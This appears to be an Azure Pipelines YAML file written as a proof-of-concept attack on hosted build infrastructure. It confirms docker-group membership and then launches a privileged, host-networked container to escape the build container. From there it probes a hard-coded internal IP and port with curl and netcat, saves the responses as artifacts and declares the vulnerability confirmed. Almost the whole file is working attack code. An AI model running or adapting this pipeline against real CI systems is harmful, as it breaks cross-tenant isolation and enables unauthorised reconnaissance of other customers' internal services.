# azure-pipelines.yml
trigger:
- main
pr:
- main

name: $(Date:yyyyMMdd)$(Rev:.r)

stages:
- stage: FinalPoc
  displayName: 'Final PoC: Cross-Tenant Service Interrogation'
  jobs:
  - job: Linux_Service_Interrogation
    displayName: 'PoC: Interact with Discovered Internal Service'
    pool:
      vmImage: 'ubuntu-22.04'
    steps:
    - checkout: none
    - task: Bash@3
      displayName: 'Escape Container and Probe Target Service'
      inputs:
        targetType: inline
        script: |
          set -euo pipefail
          mkdir -p artifacts

          echo "--- Verifying container escape vector ---"
          if ! (id | grep -q '(docker)'); then
            echo "❌ CRITICAL FAILURE: User is not in the docker group. Aborting."
            id
            exit 1
          fi
          echo "✅ Confirmed user is in 'docker' group."

          # Target IP and Port discovered from the previous scan
          TARGET_IP="10.1.0.156"
          TARGET_PORT="8084"

          echo "--- ESCAPING CONTAINER to probe ${TARGET_IP}:${TARGET_PORT} from the host ---"
          
          # We use a privileged container on the host network to run our commands.
          # This bypasses any container-level network restrictions.
          docker run --rm --privileged --network=host -v $(pwd)/artifacts:/artifacts \
            alpine:latest sh -c "
              apk add --no-cache curl netcat-openbsd

              echo '--- [HOST] Attempting to get HTTP headers and body with curl ---'
              curl -i -v --max-time 10 http://${TARGET_IP}:${TARGET_PORT}/ > /artifacts/curl_response.txt 2>&1 || true
              
              echo '--- [HOST] Attempting a raw TCP connection with netcat ---'
              printf 'GET / HTTP/1.0\r\n\r\n' | nc -w 5 ${TARGET_IP} ${TARGET_PORT} > /artifacts/netcat_response.txt 2>&1 || true
            "
          
          echo "✅ PROBE COMPLETE."
          echo "--- cURL Response ---"
          cat artifacts/curl_response.txt
          echo "--- Netcat Response ---"
          cat artifacts/netcat_response.txt

          if [ -s "artifacts/curl_response.txt" ] || [ -s "artifacts/netcat_response.txt" ]; then
            echo "✅ VULNERABILITY CONFIRMED: Successfully received a response from the internal service."
          else
            echo "⚠️ Test inconclusive. No data was returned from the service."
          fi

    - task: PublishPipelineArtifact@1
      displayName: 'Publish Service Interrogation Artifacts'
      condition: succeededOrFailed()
      inputs:
        targetPath: 'artifacts'
        artifact: 'azure-final-poc-results'
